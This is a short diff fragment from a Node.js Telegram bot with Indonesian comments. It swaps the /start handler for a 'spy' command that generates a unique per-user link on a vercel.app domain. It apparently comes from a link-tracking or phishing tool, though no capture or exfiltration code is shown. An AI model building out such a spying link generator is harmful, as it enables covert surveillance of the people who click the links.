@@ -8,8 +8,8 @@ app.use(express.json());
 
 const userLinks = {}; // Menyimpan hubungan antara ID unik dan user Telegram
 
-// Bot Telegram - Handle /start
-bot.start((ctx) => {
+// Admin menambahkan nomor ke dalam daftar
+bot.command('spy', async (ctx) => {
   const userId = ctx.chat.id;
   const randomId = crypto.randomBytes(4).toString('hex'); // ID unik
   const link = `https://dexzutelegram.vercel.app/${randomId}`;
